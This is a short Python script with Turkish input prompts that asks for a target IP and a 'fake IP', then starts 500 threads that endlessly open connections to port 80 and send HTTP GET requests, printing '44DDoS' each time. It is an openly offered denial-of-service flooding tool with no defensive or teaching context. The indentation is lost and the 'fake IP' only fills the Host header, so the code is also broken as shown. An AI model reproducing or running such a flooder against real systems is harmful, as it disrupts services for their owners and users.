import socket
import threading
import time

target = input('Hedef IP: ')
port = 80
fake_ip = input('Sahte IP: ')
def attack():
while True:
print('44DDoS')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.sendto(('GET /' + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
s.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target, port))
s.close()

for i in range(500):
thread = threading.Thread(target=attack)
thread.start()

time.sleep(0.1)
